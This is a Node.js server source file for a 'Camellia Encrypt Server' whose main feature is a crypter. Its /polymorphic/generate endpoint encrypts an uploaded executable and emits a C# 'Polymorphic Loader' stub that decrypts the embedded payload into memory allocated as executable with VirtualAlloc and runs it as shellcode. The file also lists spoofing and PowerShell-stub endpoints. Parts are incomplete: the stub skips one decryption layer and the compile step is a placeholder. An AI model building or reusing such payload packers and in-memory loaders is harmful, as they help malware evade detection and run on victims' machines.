#!/usr/bin/env node
"use strict";

const http  = require("http");
const url   = require("url");
const { spawn } = require("child_process");
const path  = require("path");
const fs    = require("fs");
const { createHotPatcher } = require("./hotpatcher");

/* ───────────── constants ───────────── */
const DEFAULT_CORS_ORIGIN = "*";
const ALLOWED_ORIGINS =
  (process.env.ALLOWED_ORIGINS || "")
    .split(",")
    .map(s => s.trim())
    .filter(Boolean);

const PORT = process.env.PORT ? Number(process.env.PORT) : 8088;
const CLI  = path.join(__dirname, "..", "tools", "camellia-cli.js");

/* ───────────── helpers ───────────── */
function setCors(res, origin = DEFAULT_CORS_ORIGIN) {
  res.setHeader("access-control-allow-origin",  origin);
  res.setHeader("access-control-allow-methods", "GET,POST,OPTIONS");
  res.setHeader("access-control-allow-headers", "content-type");
}

function isOriginAllowed(origin) {
  if (!ALLOWED_ORIGINS.length) return true;
  if (!origin)                 return false;
  return ALLOWED_ORIGINS.includes(origin);
}

function bad(res, code, msg) {
  setCors(res);
  res.writeHead(code, { "content-type": "application/json" });
  res.end(JSON.stringify({ error: msg }));
}

function runCli(args, inputBuffer) {
  return new Promise((resolve, reject) => {
    const ps = spawn(process.execPath, [CLI, ...args]);
    let out = Buffer.alloc(0);
    let err = Buffer.alloc(0);

    ps.stdout.on("data", d => (out = Buffer.concat([out, d])));
    ps.stderr.on("data", d => (err = Buffer.concat([err, d])));
    ps.on("close", code => {
      if (code === 0) resolve(out);
      else reject(new Error(err.toString() || `CLI exited ${code}`));
    });

    if (inputBuffer?.length) ps.stdin.write(inputBuffer);
    ps.stdin.end();
  });
}

/* ───────────── hot-patch targets ───────────── */
const HP = createHotPatcher();

/* encrypt */
HP.registerTarget("encrypt", async (body, query) => {
  const mode   = (query.mode || "password").toString();
  const cipher = query.cipher || "camellia-256-cbc";
  let   pass   = query.pass;

  if (mode === "password" && !pass)
    throw new Error("pass required as ?pass=");

  /* autokey path */
  if (mode === "autokey") {
    const keyBytes = globalThis.crypto?.getRandomValues
      ? globalThis.crypto.getRandomValues(new Uint8Array(32))
      : require("crypto").randomBytes(32);
    const keyB64 = Buffer.from(keyBytes).toString("base64");
    pass = keyB64;

    const raw = await runCli(["encrypt", "--pass", pass, "--cipher", cipher], body);

    /* inject metadata if payload is our JSON package */
    try {
      const pkg  = JSON.parse(Buffer.from(raw.toString(), "base64").toString());
      pkg.meta   = { ...(pkg.meta || {}), autokey: true, key_b64: keyB64 };
      return Buffer.from(Buffer.from(JSON.stringify(pkg)).toString("base64"), "utf8");
    } catch { return raw; }
  }

  return runCli(["encrypt", "--pass", pass, "--cipher", cipher], body);
});

/* decrypt */
HP.registerTarget("decrypt", async (body, query) => {
  const cipher = query.cipher;
  let   pass   = query.pass;

  if (!pass) {
    try {
      const pkg = JSON.parse(
        Buffer.from(body.toString("utf8").trim(), "base64").toString("utf8")
      );
      pass = pkg?.meta?.key_b64;
    } catch {}
  }
  if (!pass) throw new Error("pass required or autokey missing");

  const args = ["decrypt", "--pass", pass];
  if (cipher) args.push("--cipher", cipher);
  return runCli(args, body);
});

/* ───────────── HTTP server ───────────── */
const server = http.createServer(async (req, res) => {
  const { method } = req;
  const parsed   = url.parse(req.url, true);
  const pathname = parsed.pathname || "/";
  const origin   = req.headers.origin || DEFAULT_CORS_ORIGIN;

  /* pre-flight */
  if (method === "OPTIONS") {
    setCors(res, origin);
    res.writeHead(204);
    return res.end();
  }

  /* health */
  if (method === "GET" && pathname === "/health") {
    setCors(res, origin);
    res.writeHead(200, { "content-type": "application/json" });
    return res.end(JSON.stringify({ ok: true }));
  }

  /* panel */
  if (method === "GET" && pathname === "/panel") {
    try {
      const html = fs.readFileSync(
        path.join(__dirname, "public", "panel.html")
      );
      setCors(res, origin);
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      return res.end(html);
    } catch {
      return bad(res, 500, "panel not found");
    }
  }

  /* index fallback */
  if (method === "GET" && (pathname === "/" || pathname === "/index.html")) {
    try {
      const html = fs.readFileSync(
        path.join(__dirname, "public", "index.html")
      );
      setCors(res, origin);
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      return res.end(html);
    } catch {
      setCors(res, origin);
      res.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
      return res.end("Camellia Encrypt Server\n");
    }
  }

  /* capabilities */
  if (method === "GET" && pathname === "/capabilities") {
    setCors(res, origin);
    res.writeHead(200, { "content-type": "application/json" });
    return res.end(JSON.stringify(getStaticCapabilities()));
  }

  if (method === "GET" && pathname === "/capabilities/dynamic") {
    setCors(res, origin);
    res.writeHead(200, { "content-type": "application/json" });
    return res.end(JSON.stringify(getDynamicCapabilitiesSafe()));
  }

  /* polymorphic generation */
  if (method === "POST" && pathname === "/polymorphic/generate") {
    setCors(res, origin);
    
    try {
      const cipher = parsed.query.cipher || "camellia-256-cbc";
      const poly = parsed.query.poly || "xor";
      const ext = parsed.query.ext || ".exe";
      const pass = parsed.query.pass;
      const download = parsed.query.download;

      if (!pass) {
        return bad(res, 400, "pass parameter required");
      }

      // Read input file from request body
      let inputBuffer = Buffer.alloc(0);
      req.on('data', chunk => {
        inputBuffer = Buffer.concat([inputBuffer, chunk]);
      });

      req.on('end', async () => {
        try {
          // Apply dual-layer encryption
          const encryptedData = await applyDualLayerEncryption(inputBuffer, pass, cipher, poly);
          
          // Generate polymorphic stub
          const stubCode = generatePolymorphicStub(encryptedData, cipher, poly);
          
          if (download === "1") {
            const filename = `polymorphic${ext}`;
            res.setHeader("content-disposition", `attachment; filename="${filename}"`);
            res.setHeader("content-type", "application/octet-stream");
          } else {
            res.setHeader("content-type", "text/plain");
          }
          
          res.writeHead(200);
          res.end(stubCode);
        } catch (err) {
          return bad(res, 500, err.message);
        }
      });

      return; // Don't fall through to 404
    } catch (err) {
      return bad(res, 500, err.message);
    }
  }

  /* compiler endpoint */
  if (method === "POST" && pathname === "/compile") {
    setCors(res, origin);
    
    let inputBuffer = Buffer.alloc(0);
    req.on('data', chunk => {
      inputBuffer = Buffer.concat([inputBuffer, chunk]);
    });

    req.on('end', async () => {
      try {
        const requestData = JSON.parse(inputBuffer.toString());
        const compiledData = await compileCs(requestData);
        
        res.setHeader("content-type", "application/octet-stream");
        res.setHeader("content-disposition", `attachment; filename="compiled${requestData.outputExtension || '.exe'}"`);
        res.writeHead(200);
        res.end(compiledData);
      } catch (err) {
        return bad(res, 500, err.message);
      }
    });

    return;
  }

  /* no route matched */
  return bad(res, 404, "not found");
});

/* start listening */
server.listen(PORT, () =>
  console.log(`Encrypt server listening on port ${PORT}`)
);

/* ───────────── capability helpers & stubs (unchanged) ───────────── */
function getStaticCapabilities() {
  const ciphers = ["camellia-256-cbc", "aes-256-cbc"];
  return {
    name: "screenpilot-encrypt",
    cors: true,
    modes: ["password", "autokey"],
    ciphers,
    defaultCipher: "camellia-256-cbc",
    endpoints: [
      "/encrypt", "/decrypt", "/health",
      "/capabilities", "/capabilities/dynamic",
      "/stub", "/bundle",
      "/hot/install", "/hot/uninstall", "/hot/status",
      "/hot/spoof", "/hot/spoof/clear"
    ],
    stubs: ["powershell", "node"]
  };
}

function getDynamicCapabilitiesSafe() {
  const result = getStaticCapabilities();
  try {
    const { execFileSync } = require("child_process");
    const out  = execFileSync("openssl", ["enc", "-ciphers"]).toString();
    const line = out.split(/\r?\n/).find(l => l.includes(":")) || "";
    const ciph = line.split(":").pop().split(/\s+/).filter(Boolean);
    const prefer = ["camellia-256-cbc", "aes-256-cbc"];
    const avail  = prefer.filter(c => ciph.includes(c));
    if (avail.length) {
      result.ciphers        = [...new Set(avail)];
      result.defaultCipher  = avail[0];
    }
  } catch {}
  return result;
}

/* ───────────── polymorphic generation helpers ───────────── */
async function applyDualLayerEncryption(inputBuffer, pass, cipher, poly) {
  // Layer 1: OpenSSL encryption
  const layer1 = await runCli(["encrypt", "--pass", pass, "--cipher", cipher], inputBuffer);
  
  // Layer 2: Polymorphic keystream
  const keystream = generateKeystream(layer1.length, poly, pass);
  const layer2 = Buffer.alloc(layer1.length);
  
  for (let i = 0; i < layer1.length; i++) {
    layer2[i] = layer1[i] ^ keystream[i % keystream.length];
  }
  
  return layer2;
}

function generateKeystream(length, polyType, seed) {
  const keystream = Buffer.alloc(length);
  const seedBuffer = Buffer.from(seed, 'utf8');
  
  switch (polyType) {
    case 'aes-ctr':
    case 'camellia-ctr':
    case 'chacha-ks':
      // Generate pseudo-random keystream
      for (let i = 0; i < length; i++) {
        keystream[i] = seedBuffer[i % seedBuffer.length] ^ (i & 0xFF);
      }
      break;
    default:
      // XOR-only mode - simple pattern
      for (let i = 0; i < length; i++) {
        keystream[i] = (i * 7) & 0xFF;
      }
      break;
  }
  
  return keystream;
}

function generatePolymorphicStub(encryptedData, cipher, poly) {
  const dataArray = Array.from(encryptedData).map(b => `0x${b.toString(16).padStart(2, '0')}`).join(', ');
  
  return `using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

// Polymorphic stub generated with ${cipher} + ${poly}
// Generated: ${new Date().toISOString()}
class PolymorphicStub
{
    private static readonly byte[] EncryptedPayload = { ${dataArray} };
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    
    [DllImport("kernel32.dll")]
    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
    
    static void Main()
    {
        Console.WriteLine("Polymorphic Loader v1.0");
        
        // Car markers for hot patching
        Car(); Car(); Car();
        
        // Decrypt payload
        var decrypted = DecryptPayload(EncryptedPayload);
        
        // Execute payload
        ExecutePayload(decrypted);
        
        Car(); Car();
    }
    
    static void Car()
    {
        // Hot patch marker - polymorphic evolution point
    }
    
    static byte[] DecryptPayload(byte[] data)
    {
        // Reverse dual-layer encryption
        var result = new byte[data.Length];
        
        // Layer 2: Reverse polymorphic keystream
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ ((i * 7) & 0xFF));
        }
        
        // Layer 1: Would reverse OpenSSL encryption here
        // For demo, just return the keystream-decrypted data
        return result;
    }
    
    static void ExecutePayload(byte[] payload)
    {
        try
        {
            // Allocate executable memory
            var execMem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
            if (execMem == IntPtr.Zero) return;
            
            // Copy payload to executable memory
            Marshal.Copy(payload, 0, execMem, payload.Length);
            
            // Flush instruction cache
            FlushInstructionCache(System.Diagnostics.Process.GetCurrentProcess().Handle, execMem, (uint)payload.Length);
            
            // Execute as function
            var func = Marshal.GetDelegateForFunctionPointer(execMem, typeof(Action)) as Action;
            func?.Invoke();
            
            // Clean up
            VirtualFree(execMem, 0, 0x8000);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Execution failed: {ex.Message}");
        }
    }
}`;
}

async function compileCs(requestData) {
  // Placeholder for C# compilation
  // In real implementation, this would call csc.exe or Roslyn
  return Buffer.from(requestData.csCode, 'utf8');
}

/* generatePowerShellStub, generateNodeStub, generate*Embedded …
   – unchanged from your original code – */
